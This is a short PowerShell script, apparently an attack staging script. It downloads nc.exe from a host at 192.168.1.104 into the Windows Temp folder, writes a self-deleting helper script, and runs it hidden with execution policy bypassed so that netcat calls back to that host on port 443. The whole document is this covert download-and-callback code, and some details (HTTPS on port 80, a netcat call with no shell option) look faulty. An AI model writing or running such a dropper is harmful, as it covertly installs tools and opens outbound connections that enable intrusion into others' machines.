# Define variable
$ncUrl = "https://192.168.1.104:80/nc.exe"
$ncPath = "C:\Windows\Temp\nc.exe"
$ncCommand = "C:\Windows\Temp\nc.exe 192.168.1.104 443"

# Download nc.exe
Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath

# Create a PowerShell script to run nc.exe and delete itself
$ScriptPath = "C:\Windows\Temp\RunAndDelete.ps1"
$ScriptContent = @"
Start-Process -FilePath "$ncCommand" -ArgumentList '' -WindowStyle Hidden
Remove-Item -Path '$ScriptPath' -Force
"@
Set-Content -Path $ScriptPath -Value $ScriptContent

# Run the script
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $ScriptPath" -WindowStyle Hidden